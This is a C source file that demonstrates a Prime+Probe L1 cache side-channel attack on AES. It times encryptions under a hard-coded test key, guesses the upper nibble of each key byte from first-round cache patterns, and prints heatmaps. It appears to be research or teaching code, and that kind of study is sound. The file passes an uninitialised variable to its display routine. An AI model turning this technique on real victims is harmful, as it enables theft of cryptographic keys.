#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <aes.h>
#include <prime_probe.h>
#include <util.h>

#define AESSIZE 16

#define NSAMPLES 100000

typedef uint8_t aes_t[AESSIZE];

void tobinary(char* data, aes_t aes) {
    assert(strlen(data) == AESSIZE * 2);
    unsigned int x;
    for (int i = 0; i < AESSIZE; i++) {
        sscanf(data + i * 2, "%2x", &x);
        aes[i] = x;
    }
}

void grayspace(int64_t intensity, int64_t min, int64_t max, char c) {
    printf("\e[48;5;%lld;31;1m%c\e[0m",
           232 + ((intensity - min) * 24) / (max - min), c);
}

void display(int counts[256], int64_t data[256][ST_TRACEWIDTH], int guess,
             int offset) {
    int64_t min = INT64_MAX;
    int64_t max = INT64_MIN;
    for (int i = 0; i < 256; i++)
        if (counts[i])
            for (int j = 0; j < L1_SETS; j++) {
                if (min > data[i][j])
                    min = data[i][j];
                if (max < data[i][j])
                    max = data[i][j];
            }

    if (max == min)
        max++;
    for (int i = 0; i < 256; i++) {
        if (counts[i]) {
            printf("%02X. ", i);
            int set = (((i >> 4) ^ guess) + offset) % L1_SETS;
            if (offset < 0)
                set = -1;
            for (int j = 0; j < L1_SETS; j++) {
                grayspace(data[i][j], min, max, set == j ? '#' : ' ');
            }
            printf("\n");
        }
    }
}

void analyse(int64_t data[256][ST_TRACEWIDTH], uint8_t* key, int* offset) {
    int64_t max = INT64_MIN;

    for (int guess = 0; guess < 16; guess++) {
        for (int off = 0; off < L1_SETS; off++) {
            int64_t sum = 0LL;
            for (int pt = 0; pt < 16; pt++) {
                int set = (off + (pt ^ guess)) % L1_SETS;
                sum += data[pt << 4][set];
            }
            if (sum > max) {
                max = sum;
                *key = (uint8_t) guess;
                *offset = off;
            }
        }
    }
}

void crypto(uint8_t* input, uint8_t* output, void* data) {
    AES_KEY* aeskey = (AES_KEY*) data;
    AES_encrypt(input, output, aeskey);
}

int main(int ac, char** av) {
    int samples = NSAMPLES;
    int round = 1;
    int analysis = 1;
    int heatmap = 1;
    int byte = 0;

    aes_t key;
    aes_t key_guess;
    aes_t key_solution;
    char* keystr
        = "2b7e151628aed2a6abf7158809cf4f3c"; // 2 7 1 1 2 a d a a f 1 8 0 c 4 3
    tobinary(keystr, key);
    tobinary(keystr, key_solution);
    AES_KEY aeskey;
    private_AES_set_encrypt_key(key, 128, &aeskey);

    delayloop(1000000000);

    if (round == 1) {
        printf("Start Attack!\n");
        st_clusters_t clusters = syncPrimeProbe(samples, AESSIZE, 1, NULL, NULL,
                                                crypto, &aeskey, 0xf0);
        for (int i = 0; i < 16; i++) {
            int key, offset;
            printf("Key byte %2d", i);
            if (analysis) {
                analyse(clusters[i].avg, &key_guess[i], &offset);
                printf(" Guess:%1x-\n", key_guess[i]);
            } else {
                offset = -L1_SETS;
                printf("\n");
            }
            if (heatmap) {
                display(clusters[i].count, clusters[i].avg, key, offset);
                printf("\n");
            }
        }
        free(clusters);
    } else if (round == 2) {
        aes_t fixmask, fixdata;
        tobinary("00000000000000000000000000000000", fixmask);
        tobinary("00000000000000000000000000000000", fixdata);

        int col0 = (byte + 4 - (byte >> 2) & 3);
        for (int row = 0; row < 4; row++) {
            int b = row * 4 + ((col0 + row) & 3);
            if (b != byte)
                fixmask[b] = 0xff;
        }

        st_clusters_t clusters = syncPrimeProbe(samples, AESSIZE, 1, fixmask,
                                                fixdata, crypto, &aeskey, 0xff);

        display(clusters[byte].count, clusters[byte].avg, 0, -L1_SETS);
        free(clusters);
    }

    printf("key:   ");
    for (int i = 0; i < 16; i++) {
        printf("%02x ", key_solution[i]);
    }
    printf("\nguess: ");
    for (int i = 0; i < 16; i++) {
        if (key_guess[i] == key_solution[i] >> 4) {
            printf("%1x  ", key_guess[i]);
        } else
            printf("x  ");
    }
    printf("\n");
    return 0;
}
